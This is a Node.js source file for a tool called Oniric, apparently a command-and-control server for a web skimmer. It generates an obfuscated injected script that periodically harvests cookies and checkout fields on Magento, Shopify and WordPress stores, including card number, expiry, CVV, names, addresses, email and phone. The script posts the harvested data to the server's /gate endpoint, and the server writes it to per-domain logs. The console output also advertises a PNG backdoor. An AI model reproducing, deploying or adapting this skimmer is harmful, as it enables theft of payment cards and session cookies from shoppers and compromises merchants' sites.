"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.App = void 0;
const http = require("http");
const fs = require("fs");
const express = require("express");
const app = express();
const cors = require("cors");
const bodyParser = require('body-parser');
const jsObf = require('javascript-obfuscator');
var figlet = require('figlet');
const chalk = require('chalk');
var util = require('util');
class App {
    constructor() {
        app.use(cors());
        app.use(bodyParser.urlencoded({
            extended: false
        }));
        app.use(bodyParser.json());
        app.use(express.static(__dirname + '/web'));
        if (process.argv[2] === '-c') {
            if (process.argv[3] === 'config.json') {
                fs.readFile('./' + process.argv[3], "utf8", (err, jsonString) => {
                    if (err)
                        throw err;
                    this.conf = JSON.parse(jsonString);
                    this.start(this.conf.port, this.conf.domain);
                });
            }
            else {
                console.log('[!]', chalk.red('Configurazione errata immettere un file config.json'));
            }
        }
        else {
            console.log('[!]', chalk.red('Errore, immettere config.json come parametro: -c config.json'));
        }
    }
    alertMessage() {
        console.log('[!]', chalk.red('Richiesta non valida o tentativo di manomissione'));
    }
    logMessage(data) {
        console.log('[?] ' + chalk.red('Salvato nei logs di:') + JSON.stringify(data.domain) + '\n\n' + util.inspect(data, true, 14, true) + '\n');
    }
    init() {
        figlet('Oniric', (err, data) => {
            if (err) {
                console.log('Something went wrong...');
                console.dir(err);
                return;
            }
            console.log(chalk.red(data), chalk.green('By WebDiamond7 (C) 2020' + '\n\n' + ' https://github.com/webdiamond'), '\n');
            console.log('[!] ' + chalk.green('Server Status ON with ' + `PID: ${process.pid}`));
            console.log('[!] ' + chalk.yellow('Rest-API on: ' + this.conf.domain + ':' + this.conf.port + '/gate'));
            console.log('[!] ' + chalk.yellow('PNG Backdoor on: ' + this.conf.domain + ':' + this.conf.port + "/Back.png"));
            this.generateSniffer();
            console.log('[!]', chalk.cyan('<HTML Sniffer> Parsed from: ' + process.argv[3]));
            console.log('[X]', chalk.cyan('<HTML IDs> - DocumentIds: ' + this.conf.documentids));
            console.log('[X]', chalk.cyan('<HTML CLASSES> - DocumentClasses: ' + this.conf.documentclasses));
            console.log('[X]', chalk.cyan('<HTML Tags> - DocumentTags: ' + this.conf.documenttags));
        });
    }
    writeLogs(data) {
        try {
            if (fs.existsSync('./' + data.domain + '.log')) {
                fs.readFile(data.domain + '.log', 'utf8', (err, file) => {
                    if (file.toString().includes(JSON.stringify(data))) {
                        var result = file.toString().replace("/" + JSON.stringify(data) + "/g", JSON.stringify(data));
                        fs.writeFile(data.domain + '.log', result, 'utf8', (err) => {
                            if (err)
                                return console.log(err);
                        });
                    }
                    else {
                        fs.appendFile(data.domain + '.log', JSON.stringify(data) + "\n", (err) => {
                            if (err)
                                throw err;
                            this.logMessage(data);
                        });
                    }
                    if (err)
                        return console.log(err);
                });
            }
            else if (!fs.existsSync('./' + data.domain + '.log')) {
                fs.appendFile(data.domain + '.log', JSON.stringify(data) + "\n", (err) => {
                    if (err)
                        throw err;
                    this.logMessage(data);
                });
            }
        }
        catch (err) {
            console.error(err);
        }
    }
    start(x, y) {
        app.post('/gate', (req, res) => {
            if (req.body.domain === null && req.body.cookie === null) {
                this.alertMessage();
            }
            else {
                this.writeLogs(req.body);
            }
            res.status(200);
            res.end();
        });
        const web = http.createServer(app);
        web.listen(x, y, () => {
            this.init();
        });
    }
    parseJsonContent(param) {
        if (this.conf != null) {
            var common = '';
            if (param === 1) {
                this.conf.documentids.forEach((id) => {
                    common += '\'' + id + '\',';
                });
                return common.slice(0, -1);
            }
            else if (param === 2) {
                this.conf.documentclasses.forEach((id) => {
                    common += '\'' + id + '\',';
                });
                return common.slice(0, -1);
            }
            else if (param === 3) {
                this.conf.documenttags.forEach((id) => {
                    common += '\'' + id + '\',';
                });
                return common.slice(0, -1);
            }
        }
    }
    generateSniffer() {
        var a = jsObf.obfuscate(`
      setInterval(function(){
      var data = "&domain="+ document.domain + "&cookie=" + document.cookie;
      ` + `const ics = [` + this.parseJsonContent(2) + `];
      ` + `const its = [` + this.parseJsonContent(3) + `];
      const iks = ['checkout_email','checkout_shipping_address_first_name',
                   'checkout_shipping_address_last_name','checkout_shipping_address_company',
                   'checkout_shipping_address_address1','checkout_shipping_address_address2',
                   'checkout_shipping_address_zip','checkout_shipping_address_city','checkout_shipping_address_province',
                   'checkout_shipping_address_phone','number','name','expiry','verification_value','firstName',
                   'lastName','address1','postalCode','city','country','email','phoneNumber','creditCardNumber','expirationDate',
                   'cvNumber','billing_first_name','billing_last_name','billing_country_field',
                   'billing_address_1','billing_address_2','billing_postcode','billing_city',
                   'select2-billing_state-container','billing_phone','billing_email',` + this.parseJsonContent(1) + `
      ];
      its.forEach((it)=>{
        const a = document.getElementsByTagName(it);
        for (var i = 0; i < a.length; i++){
           if (a[i] !== undefined){
            data+="&"+it+"="+a[i].innerHTML;
           }
         }
       });
      iks.forEach((ik)=>{
        if (document.getElementById(ik) !== null){
         data+="&"+ik+"="+document.getElementById(ik).value;
        }
      });
      ics.forEach((ic)=> {
        const b = document.getElementsByClassName(ic);
        for (var i = 0; i < b.length; i++){
          if (b[i] !== undefined){
           data+="&"+ic+"="+b[i].value;
          }
        }
      });
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "http://` + this.conf.domain + `:` + this.conf.port + `/gate");
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send(data);
    },` + this.conf.polling + `000)`, {
            compact: true,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            shuffleStringArray: true,
            splitStrings: true,
            stringArrayThreshold: 1
        });
        if (fs.existsSync(__dirname + '/web/Sniff.js')) {
            fs.writeFile(__dirname + '/web/Sniff.js', a.getObfuscatedCode(), 'utf8', (err) => {
                if (err)
                    return console.log(err);
            });
        }
        console.log('[!] ' + chalk.yellow('JS SNIFFER on: ' + this.conf.domain + ':' + this.conf.port + "/Sniff.js"));
        console.log('[X]' + chalk.magenta(' Sniffer Time Polling: ' + this.conf.polling + 'Sec'));
        console.log('[X]' + chalk.magenta(' Sniffer Wordlist Init: ' + chalk.red('Magento') + ',' + chalk.green('Shopify') + ',' + chalk.blue('Wordpress')));
        console.log('[X]' + chalk.magenta(' Sniffer Obfuscated on: ' + this.conf.domain + ':' + this.conf.port + "/Sniff.js"));
    }
}
exports.App = App;
exports.default = new App();
